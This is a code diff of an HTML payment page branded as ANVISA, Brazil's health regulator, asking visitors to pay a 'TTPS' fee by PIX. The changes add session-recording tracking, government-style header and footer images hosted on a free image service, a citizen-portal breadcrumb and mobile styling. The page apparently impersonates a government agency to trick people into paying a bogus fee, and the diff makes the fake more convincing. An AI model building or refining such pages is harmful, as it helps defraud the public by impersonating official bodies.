@@ -4,7 +4,14 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Pagamento da Taxa TTPS | ANVISA</title>
-  <link href="https://cdn.tailwindcss.com" rel="stylesheet">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script type="text/javascript">
+      (function(c,l,a,r,i,t,y){
+          c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+          t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+          y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+      })(window, document, "clarity", "script", "r5wwtraiai");
+  </script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <style>
     body {
@@ -33,23 +40,8 @@
       transition: box-shadow 0.3s ease;
     }
     
-    .payment-container {
-      background-color: white;
-      border-radius: 12px;
-      box-shadow: 0 4px 6px rgba(0,0,0,0.05);
-      overflow: hidden;
-      max-width: 700px;
-      margin: 0 auto;
-    }
-    
-    .payment-header {
-      background-color: #f0f7ff;
-      padding: 20px;
-      border-bottom: 1px solid #e0e7ff;
-    }
-    
-    .payment-content {
-      padding: 30px;
+    .sticky-header.shadow {
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     
     .secure-badge {
@@ -109,6 +101,25 @@
       border-radius: 4px;
     }
     
+    .payment-container {
+      background-color: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+      overflow: hidden;
+      max-width: 700px;
+      margin: 0 auto;
+    }
+    
+    .payment-header {
+      background-color: #f0f7ff;
+      padding: 20px;
+      border-bottom: 1px solid #e0e7ff;
+    }
+    
+    .payment-content {
+      padding: 30px;
+    }
+    
     .pix-container {
       text-align: center;
       padding: 20px;
@@ -140,7 +151,7 @@
       margin-bottom: 16px;
     }
     
-    .copy-button {
+    .copy-btn {
       padding: 8px 16px;
       background-color: #f3f4f6;
       border: 1px solid #d1d5db;
@@ -154,11 +165,11 @@
       transition: all 0.2s ease;
     }
     
-    .copy-button:hover {
+    .copy-btn:hover {
       background-color: #e5e7eb;
     }
     
-    .copy-button i {
+    .copy-btn i {
       margin-right: 6px;
     }
     
@@ -287,10 +298,35 @@
       background-color: #fffbeb;
       color: #d97706;
     }
+    
+    /* Adicionando os estilos da imagem de cabeçalho */
+    .gov-header {
+      width: 100%;
+      max-width: 100%;
+      height: auto;
+    }
+    
+    /* Estilos para melhorar a visualização em dispositivos móveis */
+    @media (max-width: 640px) {
+      .payment-content {
+        padding: 16px;
+      }
+      
+      .countdown-value {
+        width: 40px;
+        height: 40px;
+        font-size: 18px;
+      }
+      
+      .pix-qrcode {
+        width: 180px;
+        height: 180px;
+      }
+    }
   </style>
 </head>
 <body>
-  <img src="https://i.ibb.co/btmZWCB/IMG-3113.jpg" alt="Government header" class="w-screen">
+  <img src="https://i.ibb.co/btmZWCB/IMG-3113.jpg" alt="Government header" class="gov-header">
   <div class="sticky-header">
     <div class="container mx-auto px-4 border-b border-[#0000001a]">
       <div class="flex items-center justify-between py-2">
@@ -304,6 +340,20 @@
           <i class="fas fa-shield-alt text-sm text-green-600 relative -top-1"></i>
           <i class="fas fa-lock text-sm text-green-600 relative -top-1"></i>
         </div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="container mx-auto px-4">
+    <div class="py-4">
+      <div class="flex items-center space-x-2 text-[13px]">
+        <a class="text-[#1451B4]" href="#"><i class="fas fa-home text-sm text-[#1451B4]"></i></a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <a class="text-[#1451B4]" href="#">Portal Cidadão</a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <a class="text-[#1451B4]" href="#">Verificação de Acesso</a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <span class="font-bold">Pagamento TTPS</span>
       </div>
     </div>
   </div>
@@ -361,7 +411,7 @@
           <p class="text-sm text-gray-500 mt-2 mb-4">Escaneie com o app do seu banco</p>
           
           <div class="mb-4">
-            <button id="copyPixButton" class="copy-button">
+            <button id="copyPixButton" class="copy-btn">
               <i class="fas fa-copy"></i> Copiar Código PIX
             </button>
           </div>
@@ -426,6 +476,10 @@
       </div>
     </div>
   </main>
+  
+  <div class="w-full mt-6">
+    <img src="https://i.ibb.co/DHjL5PHX/IMG-3117.jpg" alt="Imagem de rodapé do site" class="w-full">
+  </div>
   
   <script>
     // Função para recuperar os dados do usuário do localStorage
